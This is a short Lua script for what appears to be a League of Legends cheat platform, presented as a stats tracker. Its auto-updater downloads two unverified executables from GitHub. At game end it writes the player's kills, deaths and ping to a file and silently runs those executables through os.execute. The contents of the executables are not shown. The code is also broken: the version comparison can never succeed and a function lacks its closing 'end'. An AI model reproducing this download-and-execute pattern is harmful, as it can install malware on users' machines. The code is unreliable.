do
    local function AutoUpdate()
	local Version = 0.4
	local web_version = http:get("https://raw.githubusercontent.com/TheShaunyboi/BruhWalkerEncrypted/main/Tracker/RajoTracker.lua.version.txt")
	if not tonumber(web_version) == Version then
		http:download_file("https://raw.githubusercontent.com/QuePast/Bruhwalker/main/Tracker/download.exe", "RajovanTracker//download.exe")
		http:download_file("https://raw.githubusercontent.com/QuePast/Bruhwalker/main/Tracker/upload.exe", "RajovanTracker//upload.exe")
		http:download_file("https://raw.githubusercontent.com/QuePast/Bruhwalker/main/Tracker/RajoTracker.lua", "RajovanTracker//RajoTracker.lua")
	else end
    end
    AutoUpdate()
end

function on_game_end()
	if menu:get_value(getdata) == 1 then

	-- START DOWNLOAD
	filepathdownload = os.getenv('LOCALAPPDATA') .."/leaguesense/scripts/RajovanTracker/download.exe"
	os.execute(filepathdownload)

	-- WRITING
	filepath = os.getenv('LOCALAPPDATA') .."/leaguesense/scripts/RajovanTracker/stats.txt"
	file = io.open(filepath, "a")

	file:write("\nChampion = " ..game.local_player.champ_name.. "; Kills = "..game.local_player.player_stats.kills.. "; Deaths = "..game.local_player.player_stats.deaths.. "; Assists = "..game.local_player.player_stats.assists.. "; Ping = "..game.ping.. "; Time = "..game.game_time.. "; Circle Thickness = "..menu:get_value_string("circle quality", "settings").. "; Tick = "..menu:get_value_string("tick", "settings").."; ")
	file:close()
	
	-- START UPLOAD
	filepathupload = os.getenv('LOCALAPPDATA') .."/leaguesense/scripts/RajovanTracker/upload.exe"
	os.execute(filepathupload)

end

client:set_event_callback("on_game_end", on_game_end)
